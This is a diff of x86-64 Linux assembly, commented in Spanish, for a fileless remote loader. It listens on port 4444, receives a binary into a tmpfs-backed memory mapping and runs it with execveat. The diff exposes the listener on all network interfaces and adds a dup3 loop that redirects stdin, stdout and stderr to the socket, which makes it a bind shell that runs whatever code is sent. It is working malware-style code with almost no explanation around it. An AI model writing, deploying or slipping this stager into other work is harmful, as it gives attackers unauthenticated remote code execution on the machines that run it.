@@ -8,7 +8,7 @@ section .data
     sockaddr_in:
         dw 2                ; sin_family = AF_INET
         dw 0x5C11           ; sin_port = 4444 (big-endian: 0x115C → bytes 5C 11)
-        dd 0x0100007F       ; sin_addr = 127.0.0.1 (big-endian: 0x7f000001 → bytes 01 00 00 7F)
+        dd 0x00000000       ; sin_addr = 0.0.0.0 (acepta desde todas las interfaces de red)
         dq 0                ; sin_zero (padding)
 
     ; Argumentos para definir el clonado del proceso
@@ -27,7 +27,8 @@ section .data
         dq 0                ; FD de cgroup destino (si CLONE_INTO_CGROUP)
 
 section .bss
-    buff_lg: resq 1    ; Buffer donde almacenar el tamaño del fichero (64 bits)
+    buff_lg: resq 1           ; Buffer donde almacenar el tamaño del binario (8 Bytes)
+
 section .text
 
 global _start
@@ -92,7 +93,7 @@ accept_loop:
 
 ; 3 - Recepción del tamaño en bytes del fichero
 
-    xor r15, r15   ; R15 - Contiene el offset de la región de memoria compartida
+    xor r15, r15
     xor rax, rax
 
 recv_lg:
@@ -131,9 +132,9 @@ recv_lg:
 ; 5 - Preexpanción del fichero en tempfs al tamaño necesario (relleno a 0)
 
     ; FTRUNCATE
-    mov rax, 77              ; Número de syscall (ftruncate)
-    mov rdi, r14             ; Descriptor de archivo
-    mov rsi, [buff_lg]       ; Nuevo tamaño en bytes
+    mov rax, 77                  ; Número de syscall (ftruncate)
+    mov rdi, r14                 ; Descriptor de archivo
+    mov rsi, [rel buff_lg]       ; Nuevo tamaño en bytes
     syscall
 
 ; mmap con MAP_SHARED sobre un fd mapea páginas reales del fichero. 
@@ -144,13 +145,13 @@ recv_lg:
 ; 6 - Crear región de memoria compartida entre el proceso hijo y el fichero en tempfs
 
     ;MMAP
-    mov rax, 9          ; Número de syscall (mmap)
-    mov rdi, 0          ; Dirección sugerida (0 para que el SO lo elija)
-    mov rsi, [buff_lg]  ; Tamaño en bytes a reservar (ej. 4096 = 1 página)
-    mov rdx, 3          ; Permisos de protección (flags PROT_*)  PROT_READ | PROT_WRITE = 0x3
-    mov r10, 1          ; Opciones de mapeo (MAP_*)  MAP_SHARED  = 0x01
-    mov r8, r14         ; File descriptor (para mapeo de archivo; -1 si no aplica)
-    mov r9, 0           ; Offset dentro del archivo (múltiplo del tamaño de página)
+    mov rax, 9              ; Número de syscall (mmap)
+    mov rdi, 0              ; Dirección sugerida (0 para que el SO lo elija)
+    mov rsi, [rel buff_lg]  ; Tamaño en bytes a reservar (ej. 4096 = 1 página)
+    mov rdx, 3              ; Permisos de protección (flags PROT_*)  PROT_READ | PROT_WRITE = 0x3
+    mov r10, 1              ; Opciones de mapeo (MAP_*)  MAP_SHARED  = 0x01
+    mov r8, r14             ; File descriptor (para mapeo de archivo; -1 si no aplica)
+    mov r9, 0               ; Offset dentro del archivo (múltiplo del tamaño de página)
     syscall
 
 
@@ -166,15 +167,15 @@ recv_all:
     add r15, rax
 
     ;RECVFROM
-    mov rax, 45           ; Número de syscall (recvfrom)
-    mov rdi, r13          ; Descriptor del socket
-    mov rsi, r12          ; Dirección del buffer donde almacenar datos
+    mov rax, 45               ; Número de syscall (recvfrom)
+    mov rdi, r13              ; Descriptor del socket
+    mov rsi, r12              ; Dirección del buffer donde almacenar datos
     add rsi, r15
-    mov rdx, [buff_lg]    ; Tamaño máximo del buffer (bytes a recibir)
+    mov rdx, [rel buff_lg]    ; Tamaño máximo del buffer (bytes a recibir)
     sub rdx, r15
-    xor r10, r10          ; Flags de recepción (MSG_*)
-    xor r8, r8            ; Puntero a struct sockaddr (o NULL)
-    xor r9, r9            ; Puntero a socklen_t (o NULL)
+    xor r10, r10              ; Flags de recepción (MSG_*)
+    xor r8, r8                ; Puntero a struct sockaddr (o NULL)
+    xor r9, r9                ; Puntero a socklen_t (o NULL)
     syscall
 
     cmp rax, 0
@@ -183,13 +184,26 @@ recv_all:
 ; 8 - Se desvincula al proceso hijo de la región de memoria compartida
 
     ; MUNMAP
-    mov rax, 11          ; Número de syscall (munmap)
-    mov rdi, r12         ; Dirección base del mapping a eliminar
-    mov rsi, [buff_lg]   ; Tamaño en bytes a desmapear
+    mov rax, 11              ; Número de syscall (munmap)
+    mov rdi, r12             ; Dirección base del mapping a eliminar
+    mov rsi, [rel buff_lg]   ; Tamaño en bytes a desmapear
     syscall
 
 
-; 9 - Se ejecuta el contenido del fichero en tempfs
+; 9 - Se redirige la stdin/stdout/stderr al socket
+
+    xor rsi,rsi     ; File Descriptor destino (0=stdin,1=stdout,2=stderr)
+dup3:
+    ; DUP3
+    mov rax, 292    ; Número de syscall (dup3)
+    mov rdi, r13    ; File Descriptor existente a duplicar
+    xor rdx, rdx    ; Flags: 0 o O_CLOEXEC (0x80000)
+    syscall
+    inc rsi
+    cmp rsi, 3
+    jl dup3
+
+; 10 - Se ejecuta el contenido del fichero en tempfs
 
     ;EXECVEAT
     mov rax, 322              ; Número de syscall (execveat)
@@ -206,5 +220,7 @@ exit:
     mov rax, 60
     xor rdi, rdi  
     syscall
+
+
 
 
